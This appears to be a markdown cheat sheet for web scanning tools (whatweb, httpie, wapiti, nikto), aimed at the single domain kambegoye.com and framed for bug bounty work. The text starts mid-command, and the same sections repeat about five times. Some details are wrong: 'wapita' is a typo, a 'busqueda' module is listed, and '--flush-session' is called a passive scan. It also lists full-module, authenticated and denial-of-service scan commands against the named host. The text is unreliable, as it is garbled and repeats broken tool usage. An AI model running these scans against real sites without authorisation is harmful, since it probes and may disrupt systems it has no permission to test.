wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
- Sensitive info in headers
- SSL/TLS issues

**Tips**:
- Use `-Tuning x` for comprehensive scan
- Check `-mutate` for directory brute force
- Combine with whatweb for tech identification
- Filter false positives with `-IgnoreCode`

---

## Quick Reference - New Tools

| Tool | Command | Purpose |
|------|---------|---------|
| whatweb | `whatweb target.com` | Technology fingerprinting |
| httpie | `http GET target.com` | Better HTTP client |
| wapiti | `wapiti -u target.com` | Full vulnerability scanner |
| nikto | `nikto -h target.com` | Web server scanner |

## Additional Web Tools (Just Installed)

### whatweb - Technology Fingerprinting
**Location**: `/usr/bin/whatweb`
**Purpose**: Identify technologies used by web servers (CMS, frameworks, libraries)

**Use Cases**:
```bash
# Basic scan
whatweb kambegoye.com

# Aggressive scan (more plugins)
whatweb kambegoye.com --aggression=3

# Scan multiple targets
whatweb target1.com target2.com --log-xml=results.xml

# Quick scan with minimal plugins
whatweb kambegoye.com --quick

# Detailed output
whatweb kambegoye.com -v

# Scan with specific plugins
whatweb kambegoye.com --plugins=nginx,php

# JSON output
whatweb kambegoye.com --log-json=results.json

# Custom wordlist
whatweb --input-file=targets.txt
```

**Common Plugins**:
- `nginx`, `apache`, `iis` - Web servers
- `php`, `asp`, `jsp` - Scripting languages
- `wordpress`, `drupal`, `joomla` - CMS
- `jquery`, `react`, `vue` - JS frameworks
- `aws-s3`, `google-analytics` - Cloud/CDN

**Tips**:
- Use `--aggression=3` for deeper fingerprinting
- Combine with nuclei for targeted vulnerability scanning
- Check for outdated versions (known CVEs)

---

### httpie - Human-Friendly HTTP Client
**Location**: `/usr/bin/http`
**Purpose**: Intuitive replacement for curl with better syntax and JSON support

**Use Cases**:
```bash
# Basic GET request
http kambegoye.com

# POST with JSON data
http POST kambegoye.com/api/login username=admin password=secret

# With headers
http GET kambegoye.com Authorization:"Bearer token"

# Form data
http -f POST kambegoye.com/search q=test category=api

# Download file
http -d kambegoye.com/image.jpg

# Upload file
http -f POST kambegoye.com/upload file@image.jpg

# Follow redirects
http --follow kambegoye.com

# Timeout
http --timeout=30 kambegoye.com

# Verbose (show request/response)
http -v kambegoye.com

# Session handling
http --session=auth kambegoye.com/login u=admin p=pass
http --session=auth kambegoye.com/secure

# Proxy support
http --proxy=http://proxy:8080 kambegoye.com
```

**Advantages over curl**:
- Automatic JSON formatting
- Readable colorized output
- Session persistence
- Simpler syntax

**Tips for Bug Bounty**:
- Use `http -v` to see exact headers being sent
- Test various HTTP methods (PUT, DELETE, PATCH)
- Check for HTTP parameter pollution
- Test HTTP desync attacks

---

### wapiti - Full Web Vulnerability Scanner
**Location**: `/usr/bin/wapiti`
**Purpose**: Comprehensive web application vulnerability scanner

**Use Cases**:
```bash
# Basic scan
wapiti -u kambegoye.com

# Scan with specific modules
wapiti -u kambegoye.com --modules struts,sql

# Full scan with all modules
wapiti -u kambegoye.com --modules all

# Scan with authentication
wapiti -u kambegoye.com --auth-type basic --auth-cred admin:secret
wapiti -u kambegoye.com --form-cred "http://target.com/login:username=admin&password=secret"

# With cookies
wapiti -u kambegoye.com --cookie "PHPSESSID=xxx"

# Crawl depth
wapiti -u kambegoye.com --depth 3

# Output formats
wapiti -u kambegoye.com -f json -o results/
wapiti -u kambegoye.com -f html -o report.html

# Scan specific paths only
wapita -u kambegoye.com --scope "kambegoye.com/api/*"

# Exclude paths
wapiti -u kambegoye.com --exclude "logout,admin"

# Passive scan (no exploitation)
wapiti -u kambegoye.com --flush-session

# Continue interrupted scan
wapiti -u kambegoye.com --continue
```

**Vulnerability Modules**:
- `backup` - Backup files disclosure
- `blindsql` - Blind SQL injection
- `busqueda` - Directory traversal
- `crlf` - CRLF injection
- `exec` - Command execution
- `file` - File handling issues
- `htaccess` - Misconfigured htaccess
- `nikto` - Nikto integration
- `sql` - SQL injection
- `ssrf` - Server-side request forgery
- `xss` - Cross-site scripting
- `xxe` - XML external entity

**Tips**:
- Use `--scope` to stay within target
- Scan with and without authentication
- Check JSON output for automation
- Combine with nuclei for validation

---

### nikto - Web Server Scanner
**Location**: `/usr/bin/nikto`
**Purpose**: Scan web servers for dangerous files, outdated software, configuration issues

**Use Cases**:
```bash
# Basic scan
nikto -h kambegoye.com

# HTTPS scan
nikto -h https://kambegoye.com

# With port
nikto -h kambegoye.com -p 8080

# Multiple ports
nikto -h kambegoye.com -p 80,443,8080

# Scan with authentication
nikto -h kambegoye.com -id admin:secret

# Cookies
nikto -h kambegoye.com -cookie "PHPSESSID=xxx"

# Tunings (reduce noise)
nikto -h kambegoye.com -Tuning 1  # Interesting files
nikto -h kambegoye.com -Tuning 2  # Misconfiguration
nikto -h kambegoye.com -Tuning 3  # Information disclosure
nikto -h kambegoye.com -Tuning x  # All

# Output formats
nikto -h kambegoye.com -o results.txt
nikto -h kambegoye.com -Format json -o results.json

# Pause between requests
nikto -h kambegoye.com -Pause 2

# Verbose
nikto -h kambegoye.com -v

# Update plugins
nikto -update

# List all tests
nikto -list-plugins
```

**Tuning Options**:
- `1` - Interesting files
- `2` - Misconfiguration
- `3` - Information disclosure
- `4` - Injection (XSS, etc.)
- `5` - Remote file retrieval
- `6` - Denial of service
- `7` - Remote file retrieval - IIS
- `8` - Command execution - remote
- `9` - SQL Injection
- `0` - File upload
- `a` - Authentication bypass
- `b` - Software identification
- `c` - Source code disclosure
- `d` - Path traversal
- `e` - Logic error

**Common Findings**:
- Default/admin files (/admin, /phpmyadmin)
- Outdated software versions
- Missing security headers
- HTTP methods enabled (TRACE, OPTIONS)
